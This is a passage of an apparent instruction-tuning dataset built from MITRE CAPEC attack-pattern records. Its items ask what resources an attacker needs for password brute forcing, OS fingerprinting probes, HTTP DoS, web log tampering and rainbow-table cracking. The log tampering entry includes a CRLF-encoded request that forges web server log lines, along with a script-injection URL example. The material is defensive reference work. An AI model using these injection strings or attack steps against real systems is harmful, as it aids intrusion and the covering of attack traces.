              "@Section": "Section 3.6.3 TCP UDP Ping, pg. 63"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Prerequisites, Description, Description Summary, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Password Brute Forcing (CAPEC ID: 49), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nA powerful enough computer for the job with sufficient CPU, RAM and HD. Exact requirements will depend on the size of the brute force job and the time requirement for completion. Some brute forcing jobs may require grid or distributed computing (e.g. DES Challenge).",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A powerful enough computer for the job with sufficient CPU, RAM and HD. Exact requirements will depend on the size of the brute force job and the time requirement for completion. Some brute forcing jobs may require grid or distributed computing (e.g. DES Challenge).",
      "@Name": "Password Brute Forcing (CAPEC ID: 49)",
      "attack_ptrn": {
        "@ID": "49",
        "@Name": "Password Brute Forcing",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary tries every possible value for a password until they succeed. A brute force attack, if feasible computationally, will always be successful because it will essentially go through all possible passwords given the alphabet used (lower case letters, upper case letters, numbers, symbols, etc.) and the maximum length of the password.",
        "Extended_Description": {
          "xhtml:p": "A system will be particularly vulnerable to this type of an attack if it does not have a proper enforcement mechanism in place to ensure that passwords selected by users are strong passwords that comply with an adequate password policy. In practice a pure brute force attack on passwords is rarely used, unless the password is suspected to be weak. Other password cracking methods exist that are far more effective (e.g. dictionary attacks, rainbow tables, etc.). Knowing the password policy on the system can make a brute force attack more efficient. For instance, if the policy states that all passwords must be of a certain level, there is no need to check smaller candidates."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "112"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "600"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "560"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "561"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "653"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine application's/system's password policy] Determine the password policies of the target application/system.",
              "Technique": [
                "Determine minimum and maximum allowed password lengths.",
                "Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc.).",
                "Determine account lockout policy (a strict account lockout policy will prevent brute force attacks)."
              ]
            },
            {
              "Step": "2",
              "Phase": "Exploit",
              "Description": "[Brute force password] Given the finite space of possible passwords dictated by the password policy determined in the previous step, try all possible passwords for a known user ID until application/system grants access.",
              "Technique": [
                "Manually or automatically enter all possible passwords through the application/system's interface. In most systems, start with the shortest and simplest possible passwords, because most users tend to select such passwords if allowed to do so.",
                "Perform an offline dictionary attack or a rainbow table attack against a known password hash."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "An adversary needs to know a username to target.",
            "The system uses password based authentication as the one factor authentication mechanism.",
            "An application does not have a password throttling mechanism in place. A good password throttling mechanism will make it almost impossible computationally to brute force a password as it may either lock out the user after a certain number of incorrect attempts or introduce time out periods. Both of these would make a brute force attack impractical."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "A brute force attack is very straightforward. A variety of password cracking tools are widely available."
          }
        },
        "Resources_Required": {
          "Resource": "A powerful enough computer for the job with sufficient CPU, RAM and HD. Exact requirements will depend on the size of the brute force job and the time requirement for completion. Some brute forcing jobs may require grid or distributed computing (e.g. DES Challenge)."
        },
        "Indicators": {
          "Indicator": "Many incorrect login attempts are detected by the system."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Implement a password throttling mechanism. This mechanism should take into account both the IP address and the log in name of the user.",
            "Put together a strong password policy and make sure that all user created passwords comply with it. Alternatively automatically generate strong passwords for users.",
            "Passwords need to be recycled to prevent aging, that is every once in a while a new password must be chosen."
          ]
        },
        "Example_Instances": {
          "Example": [
            {
              "xhtml:p": [
                "A system does not enforce a strong password policy and the user picks a five letter password consisting of lower case English letters only. The system does not implement any password throttling mechanism. Assuming the adversary does not know the length of the users' password, an adversary can brute force this password in maximum 1+26+26^2+26^3+26^4+26^5 = 1 + 26 + 676 + 17576 + 456976 + 11,881,376 = 12,356,631 attempts, and half these tries (6,178,316) on average. Using modern hardware this attack is trivial. If the adversary were to assume that the user password could also contain upper case letters (and it was case sensitive) and/or numbers, than the number of trials would have been larger.",
                "An adversary's job would have most likely been even easier because many users who choose easy to brute force passwords like this are also likely to use a word that can be found in the dictionary. Since there are far fewer valid English words containing up to five letters than 12,356,631, an attack that tries each of the entries in the English dictionary would go even faster."
              ]
            },
            "A weakness exists in the automatic password generation routine of Mailman prior to 2.1.5 that causes only about five million different passwords to be generated. This makes it easy to brute force the password for all users who decided to let Mailman automatically generate their passwords for them. Users who chose their own passwords during the sign up process would not have been affected (assuming that they chose strong passwords). See also: CVE-2004-1143"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "521"
            },
            {
              "@CWE_ID": "262"
            },
            {
              "@CWE_ID": "263"
            },
            {
              "@CWE_ID": "257"
            },
            {
              "@CWE_ID": "654"
            },
            {
              "@CWE_ID": "307"
            },
            {
              "@CWE_ID": "308"
            },
            {
              "@CWE_ID": "309"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1110.001",
            "Entry_Name": "Brute Force:Password Guessing"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Description, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Consequences, Related_Attack_Patterns, Related_Weaknesses, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: ICMP Error Message Echoing Integrity Probe (CAPEC ID: 330)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern ICMP Error Message Echoing Integrity Probe (CAPEC ID: 330):\nA tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, \"Port Unreachable..",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, \"Port Unreachable..",
      "@Name": "ICMP Error Message Echoing Integrity Probe (CAPEC ID: 330)",
      "attack_ptrn": {
        "@ID": "330",
        "@Name": "ICMP Error Message Echoing Integrity Probe",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary uses a technique to generate an ICMP Error message (Port Unreachable, Destination Unreachable, Redirect, Source Quench, Time Exceeded, Parameter Problem) from a target and then analyze the integrity of data returned or \"Quoted\" from the originating request that generated the error message.",
        "Extended_Description": {
          "xhtml:p": [
            "A tremendous amount of information about the host operating system can be deduced from its 'echoing' characteristics. Notably, inspection of key protocol header fields, including the echoed header fields of the encapsulating protocol can yield a wealth of data about the host operating system or firmware version.",
            "For this purpose \"Port Unreachable\" error messages are often used, as generating them requires the adversary to send a UDP datagram to a closed port on the target. When replying with an ICMP error message some IP/ICMP stack implementations change aspects of the IP header, change or reverse certain byte orders, reset certain field values to default values which differ between operating system and firmware implementations, and make other changes. Some IP/ICMP stacks are decidedly broken, indicating an idiosyncratic behavior that differs from the RFC specifications, such as the case when miscalculations affect a field value."
          ]
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "312"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card."
        },
        "Resources_Required": {
          "Resource": "A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, \"Port Unreachable.."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 56"
            },
            {
              "@External_Reference_ID": "REF-123"
            },
            {
              "@External_Reference_ID": "REF-124"
            },
            {
              "@External_Reference_ID": "REF-262"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Passive OS Fingerprinting (CAPEC ID: 313)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Passive OS Fingerprinting (CAPEC ID: 313):\nAny tool capable of monitoring network communications, like a packet sniffer (e.g., Wireshark)",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Any tool capable of monitoring network communications, like a packet sniffer (e.g., Wireshark)",
      "@Name": "Passive OS Fingerprinting (CAPEC ID: 313)",
      "attack_ptrn": {
        "@ID": "313",
        "@Name": "Passive OS Fingerprinting",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": "An adversary engages in activity to detect the version or type of OS software in a an environment by passively monitoring communication between devices, nodes, or applications. Passive techniques for operating system detection send no actual probes to a target, but monitor network or client-server communication between nodes in order to identify operating systems based on observed behavior as compared to a database of known signatures or values. While passive OS fingerprinting is not usually as reliable as active methods, it is generally better able to evade detection.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "224"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The ability to monitor network communications.Access to at least one host, and the privileges to interface with the network interface card."
        },
        "Resources_Required": {
          "Resource": "Any tool capable of monitoring network communications, like a packet sniffer (e.g., Wireshark)"
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Hide Activities"
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1082",
            "Entry_Name": "System Information Discovery"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 56"
            },
            {
              "@External_Reference_ID": "REF-128"
            },
            {
              "@External_Reference_ID": "REF-212",
              "@Section": "Chapter 8. Remote OS Detection"
            },
            {
              "@External_Reference_ID": "REF-130"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: HTTP DoS (CAPEC ID: 469)",
    "context": "",
    "output": "The resources required to execute HTTP DoS (CAPEC ID: 469) are the following: Ability to issues hundreds of HTTP requests",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Ability to issues hundreds of HTTP requests",
      "@Name": "HTTP DoS (CAPEC ID: 469)",
      "attack_ptrn": {
        "@ID": "469",
        "@Name": "HTTP DoS",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker performs flooding at the HTTP level to bring down only a particular web application rather than anything listening on a TCP/IP connection. This denial of service attack requires substantially fewer packets to be sent which makes DoS harder to detect. This is an equivalent of SYN flood in HTTP. The idea is to keep the HTTP session alive indefinitely and then repeat that hundreds of times. This attack targets resource depletion weaknesses in web server software. The web server will wait to attacker's responses on the initiated HTTP sessions while the connection threads are being exhausted.",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "227"
          }
        },
        "Prerequisites": {
          "Prerequisite": "HTTP protocol is usedWeb server used is vulnerable to denial of service via HTTP flooding"
        },
        "Resources_Required": {
          "Resource": "Ability to issues hundreds of HTTP requests"
        },
        "Mitigations": {
          "Mitigation": [
            "Configuration: Configure web server software to limit the waiting period on opened HTTP sessions",
            "Design: Use load balancing mechanisms"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "770"
            },
            {
              "@CWE_ID": "772"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1499.002",
            "Entry_Name": "Endpoint Denial of Service: Service Exhaustion Flood"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-406"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: TCP 'RST' Flag Checksum Probe (CAPEC ID: 328)",
    "context": "",
    "output": "required resources:\nA tool capable of sending and receiving packets from a remote system.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A tool capable of sending and receiving packets from a remote system.",
      "@Name": "TCP 'RST' Flag Checksum Probe (CAPEC ID: 328)",
      "attack_ptrn": {
        "@ID": "328",
        "@Name": "TCP 'RST' Flag Checksum Probe",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "This OS fingerprinting probe performs a checksum on any ASCII data contained within the data portion or a RST packet. Some operating systems will report a human-readable text message in the payload of a 'RST' (reset) packet when specific types of connection errors occur. RFC 1122 allows text payloads within reset packets but not all operating systems or routers implement this functionality.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "312"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card."
        },
        "Resources_Required": {
          "Resource": "A tool capable of sending and receiving packets from a remote system."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 56"
            },
            {
              "@External_Reference_ID": "REF-128"
            },
            {
              "@External_Reference_ID": "REF-212",
              "@Section": "Chapter 8. Remote OS Detection"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: ICMP IP 'ID' Field Error Message Probe (CAPEC ID: 332)",
    "context": "",
    "output": "The resources required to execute ICMP IP 'ID' Field Error Message Probe (CAPEC ID: 332) are the following: A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, \"Port Unreachable.\"",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, \"Port Unreachable.\"",
      "@Name": "ICMP IP 'ID' Field Error Message Probe (CAPEC ID: 332)",
      "attack_ptrn": {
        "@ID": "332",
        "@Name": "ICMP IP 'ID' Field Error Message Probe",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary sends a UDP datagram having an assigned value to its internet identification field (ID) to a closed port on a target to observe the manner in which this bit is echoed back in the ICMP error message. This allows the attacker to construct a fingerprint of specific OS behaviors.",
        "Extended_Description": {
          "xhtml:p": "The internet identification field (ID) is typically utilized for reassembling a fragmented packet. RFC791 and RFC815 discusses about IP datagrams, fragmentation and reassembly. Some operating systems or router firmware reverse the bit order of the ID field when echoing the IP Header portion of the original datagram within the ICMP error message. There are three behaviors related to the IP ID field that can be used to distinguish remote operating systems or firmware: 1) it is echoed back identically to the bit order of the ID field in the original IP header, 2) it is echoed back, but the byte order has been reversed, or it contains an incorrect or unexpected value. Different operating systems will respond by setting the IP ID field differently within error messaging."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "312"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The ability to monitor and interact with network communications. Access to at least one host, and the privileges to interface with the network interface card."
        },
        "Resources_Required": {
          "Resource": "A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, \"Port Unreachable.\""
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "204"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 56"
            },
            {
              "@External_Reference_ID": "REF-123"
            },
            {
              "@External_Reference_ID": "REF-124"
            },
            {
              "@External_Reference_ID": "REF-262"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description, Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Weaknesses, Resources_Required"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Web Server Logs Tampering (CAPEC ID: 81)",
    "context": "",
    "output": "The resources required to execute Web Server Logs Tampering (CAPEC ID: 81) are the following: Ability to send specially formatted HTTP request to web server",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Ability to send specially formatted HTTP request to web server",
      "@Name": "Web Server Logs Tampering (CAPEC ID: 81)",
      "attack_ptrn": {
        "@ID": "81",
        "@Name": "Web Server Logs Tampering",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "Web Logs Tampering attacks involve an attacker injecting, deleting or otherwise tampering with the contents of web logs typically for the purposes of masking other malicious behavior. Additionally, writing malicious data to log files may target jobs, filters, reports, and other agents that process the logs in an asynchronous attack pattern. This pattern of attack is similar to \"Log Injection-Tampering-Forging\" except that in this case, the attack is targeting the logs of the web server and not the application.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "268"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine Application Web Server Log File Format] The attacker observes the system and looks for indicators of which logging utility is being used by the web server.",
              "Technique": "Determine logging utility being used by application web server (e.g. log4j), only possible if the application is known by the attacker or if the application returns error messages with logging utility information."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Determine Injectable Content] The attacker launches various logged actions with malicious data to determine what sort of log injection is possible.",
              "Technique": "Attacker triggers logged actions with maliciously crafted data as inputs, parameters, arguments, etc."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Manipulate Log Files] The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted request that the web server will receive and write into the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack.",
              "Technique": [
                {
                  "xhtml:p": [
                    "Indirectly through injection, use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry.",
                    "For example: The HTTP request for \"/index.html%0A%0DIP_ADDRESS- - DATE_FORMAT] \"GET /forged-path HTTP/1.1\" 200 - \"-\" USER_AGENT\" may add the log line into Apache \"access_log\" (for example). Different applications may require different encodings of the carriage return and line feed characters."
                  ]
                },
                {
                  "xhtml:p": [
                    "Directly through log file or database manipulation, use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry.",
                    "For example: The HTTP request for \"/index.html%0A%0DIP_ADDRESS- - DATE_FORMAT] \"GET /forged-path HTTP/1.1\" 200 - \"-\" USER_AGENT\" may add the log line into Apache \"access_log\" (for example). Different applications may require different encodings of the carriage return and line feed characters."
                  ]
                },
                "Directly through log file or database manipulation, modify existing log entries."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Target server software must be a HTTP server that performs web logging."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "To input faked entries into Web logs"
          }
        },
        "Resources_Required": {
          "Resource": "Ability to send specially formatted HTTP request to web server"
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Integrity",
            "Impact": "Modify Data"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Use input validation before writing to web log",
            "Design: Validate all log data before it is output"
          ]
        },
        "Example_Instances": {
          "Example": "Most web servers have a public interface, even if the majority of the site is password protected, there is usually at least a login site and brochureware that is publicly available. HTTP requests to the site are also generally logged to a Web log. From an attacker point of view, standard HTTP requests containing a malicious payload can be sent to the public website (with no other access required), when those requests appear in the log (such as http://victimsite/index.html?< malicious script> if they are followed by an administrator this may be sufficient to probe the administrator's host or local network."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "117"
            },
            {
              "@CWE_ID": "93"
            },
            {
              "@CWE_ID": "75"
            },
            {
              "@CWE_ID": "221"
            },
            {
              "@CWE_ID": "96"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "150"
            },
            {
              "@CWE_ID": "276"
            },
            {
              "@CWE_ID": "279"
            },
            {
              "@CWE_ID": "116"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated @Name"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2022-09-29",
            "#text": "Web Logs Tampering"
          }
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Rainbow Table Password Cracking (CAPEC ID: 55)",
    "context": "",
    "output": "The resources required to execute Rainbow Table Password Cracking (CAPEC ID: 55) are the following: Rainbow table of password hash chains with the right algorithm used. A password cracking tool that leverages this rainbow table will also be required. Hash(es) of the password is required.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Rainbow table of password hash chains with the right algorithm used. A password cracking tool that leverages this rainbow table will also be required. Hash(es) of the password is required.",
      "@Name": "Rainbow Table Password Cracking (CAPEC ID: 55)",
      "attack_ptrn": {
        "@ID": "55",
        "@Name": "Rainbow Table Password Cracking",
